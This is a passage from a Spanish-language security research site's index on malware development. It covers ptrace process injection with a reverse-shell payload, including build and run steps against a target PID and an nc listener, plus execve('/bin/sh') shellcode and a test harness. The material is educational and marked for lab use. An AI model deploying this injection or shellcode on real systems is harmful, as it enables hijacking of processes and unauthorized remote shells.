\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502 +0x000: shellcode _start (fork)                     \u2502\u25c4\u2500\u2500\u2500\u2524 Nuevo RIP\n\u2502  \u2502 +0x008: ...                                         \u2502    \u2502\n\u2502  \u2502 +0x010: c\u00f3digo padre (jmp a retorno)                \u2502    \u2502\n\u2502  \u2502 +0x020: .child (setsid, socket, connect...)         \u2502    \u2502\n\u2502  \u2502 +0x080: .dup2 loop                                  \u2502    \u2502\n\u2502  \u2502 +0x0A0: execve(\"/bin/sh\")                           \u2502    \u2502\n\u2502  \u2502 ...                                                 \u2502    \u2502\n\u2502  \u2502 +0xFF8: RIP de retorno original                     \u2502\u25c4\u2500\u2500\u2500\u2524 Guardado aqu\u00ed\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#compilacion-y-uso","title":"Compilaci\u00f3n y uso","text":"<pre><code># Compilar el inyector\nnasm -f elf64 proc_inj.asm -o proc_inj.o\nld proc_inj.o -o proc_inj\n\n# Compilar el shellcode (para testing independiente)\nnasm -f elf64 proc_inj_rev_tcp.asm -o shell.o\nld shell.o -o shell\n\n# Encontrar PID del proceso objetivo\nps aux | grep &lt;nombre_proceso&gt;\n\n# Modificar el PID en proc_inj.asm (l\u00ednea: mov r15, &lt;PID&gt;)\n\n# Recompilar y ejecutar (requiere CAP_SYS_PTRACE o mismo UID)\n./proc_inj\n\n# En otra terminal: listener para la reverse shell\nnc -lvnp 4444\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#notas-adicionales","title":"Notas adicionales","text":""},{"location":"research/malware-dev/ptrace-injection/#sobre-orig_rax","title":"Sobre orig_rax","text":"<p>Antes de hacer <code>PTRACE_DETACH</code>, establecemos <code>orig_rax = -1</code>. Esto es crucial porque si el proceso estaba en medio de una syscall cuando lo interrumpimos, Linux podr\u00eda intentar reiniciar esa syscall autom\u00e1ticamente. Al establecer <code>orig_rax = -1</code>, le indicamos al kernel que no hay syscall que reiniciar.</p>"},{"location":"research/malware-dev/ptrace-injection/#sobre-los-registros-clobbered","title":"Sobre los registros clobbered","text":"<p>Los registros <code>R11</code> y <code>RCX</code> son \"clobbered\" (destruidos) por cada <code>syscall</code>. El kernel los usa internamente:</p> <ul> <li>RCX almacena el RIP de retorno</li> <li>R11 almacena los RFLAGS</li> </ul> <p>Por eso en el shellcode usamos <code>R11</code> para calcular direcciones relativas justo despu\u00e9s del fork, antes de cualquier otra syscall.</p>"},{"location":"research/malware-dev/ptrace-injection/#consideraciones-de-seguridad","title":"Consideraciones de seguridad","text":"<p>Para que ptrace funcione:</p> <ol> <li>El tracer debe tener el mismo UID que el tracee, O</li> <li>El tracer debe tener <code>CAP_SYS_PTRACE</code>, O  </li> <li>El tracer debe ser root</li> </ol> <p>Adem\u00e1s, <code>/proc/sys/kernel/yama/ptrace_scope</code> controla restricciones adicionales:</p> <ul> <li>0: Sin restricciones</li> <li>1: Solo procesos hijos (default en muchas distros)</li> <li>2: Solo con CAP_SYS_PTRACE</li> <li>3: Ptrace completamente deshabilitado</li> </ul> <p>Solo en entornos controlados</p> <p>Este c\u00f3digo es para fines educativos y de investigaci\u00f3n. Ejecutar \u00fanicamente en m\u00e1quinas virtuales o entornos de laboratorio propios. El uso indebido de estas t\u00e9cnicas es ilegal.</p> <p>Referencias</p> <ul> <li>ptrace(2) - Linux manual</li> <li>Syscall Table x86-64</li> <li>user_regs_struct - Linux source</li> </ul>"},{"location":"research/malware-dev/shellcode-basics/","title":"Shellcode Basics","text":"<p>Fundamentos de desarrollo de shellcode para Linux x86-64.</p>"},{"location":"research/malware-dev/shellcode-basics/#que-es-shellcode","title":"\u00bfQu\u00e9 es shellcode?","text":"<p>Shellcode es c\u00f3digo m\u00e1quina dise\u00f1ado para ser inyectado y ejecutado en el contexto de otro proceso.</p>"},{"location":"research/malware-dev/shellcode-basics/#caracteristicas","title":"Caracter\u00edsticas","text":"<ul> <li>Position Independent: no depende de direcciones fijas</li> <li>Null-free: evita bytes nulos (<code>0x00</code>)</li> <li>Peque\u00f1o: menor tama\u00f1o posible</li> </ul>"},{"location":"research/malware-dev/shellcode-basics/#syscall-en-x86-64","title":"Syscall en x86-64","text":"<p>En Linux x86-64, las syscalls se invocan con la instrucci\u00f3n <code>syscall</code>:</p> Registro Prop\u00f3sito <code>rax</code> N\u00famero de syscall <code>rdi</code> Argumento 1 <code>rsi</code> Argumento 2 <code>rdx</code> Argumento 3 <code>r10</code> Argumento 4 <code>r8</code> Argumento 5 <code>r9</code> Argumento 6"},{"location":"research/malware-dev/shellcode-basics/#execvebinsh","title":"execve(\"/bin/sh\")","text":"<pre><code>; Linux x86-64 execve(\"/bin/sh\")\n; nasm -f elf64 shell.asm -o shell.o\n; ld shell.o -o shell\n\nglobal _start\n\nsection .text\n_start:\n    ; Limpiar registros\n    xor rax, rax\n    xor rdx, rdx        ; envp = NULL\n    xor rsi, rsi        ; argv = NULL\n\n    ; Push \"/bin/sh\" a la pila\n    push rax            ; null terminator\n    mov rbx, 0x68732f6e69622f  ; \"/bin/sh\" en little-endian\n    push rbx\n\n    ; rdi = pointer a \"/bin/sh\"\n    mov rdi, rsp\n\n    ; execve(rdi, rsi, rdx)\n    mov al, 59          ; syscall number para execve\n    syscall\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#extraer-bytes","title":"Extraer bytes","text":"<pre><code>objdump -d shell.o | grep -Po '\\s\\K[a-f0-9]{2}(?=\\s)' | sed 's/^/\\\\x/g' | tr -d '\\n'\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#evitar-null-bytes","title":"Evitar null bytes","text":"<pre><code>; MAL - contiene null bytes\nmov rax, 0x3b           ; 48 c7 c0 3b 00 00 00\n\n; BIEN - sin null bytes  \nxor rax, rax\nmov al, 0x3b            ; 48 31 c0 b0 3b\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#testear-shellcode","title":"Testear shellcode","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nunsigned char shellcode[] = \n    \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\x31\\xf6\"\n    \"\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\"\n    \"\\x68\\x00\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\";\n\nint main() {\n    printf(\"Shellcode length: %zu\\n\", strlen(shellcode));\n\n    void (*sc)() = (void(*)())shellcode;\n    sc();\n\n    return 0;\n}\n</code></pre> <pre><code>gcc -z execstack -fno-stack-protector -o test test.c\n./test\n</code></pre> <p>Solo en entornos controlados</p> <p>Ejecutar shellcode solo en m\u00e1quinas virtuales o entornos de laboratorio.</p> <p>Referencias</p> <ul> <li>Syscall Table x86-64</li> <li>Shell-Storm Shellcode DB</li> </ul>"}]}